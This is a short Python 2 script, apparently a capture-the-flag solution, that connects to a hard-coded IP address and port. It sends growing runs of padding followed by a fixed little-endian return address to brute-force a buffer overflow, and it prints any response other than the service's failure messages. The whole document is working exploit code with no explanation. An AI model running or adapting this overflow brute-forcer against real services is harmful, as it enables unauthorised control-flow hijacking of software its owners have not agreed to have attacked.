#!/usr/bin/python

import socket
import sys
import time

server_address = ('104.236.255.49', 12342)
overflow_str = chr(int("32", 16)) + chr(int("87", 16)) + chr(int("04", 16)) + chr(int("08", 16)) + "\n"

for i in range(1, 100):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(server_address)
  sock.recv(64)
  overflow = ("A" * i) + overflow_str
  sock.sendall(overflow)
  data = sock.recv(128)
  sock.close()
  print "i = " + str(i)
  if data != "You have bad luck.\nGoodbye.\n" and data != "You have bad luck.\nsegmentation fault\n" and data != "You have bad luck.\nGoodbye.\nsegmentation fault\n":
    print data
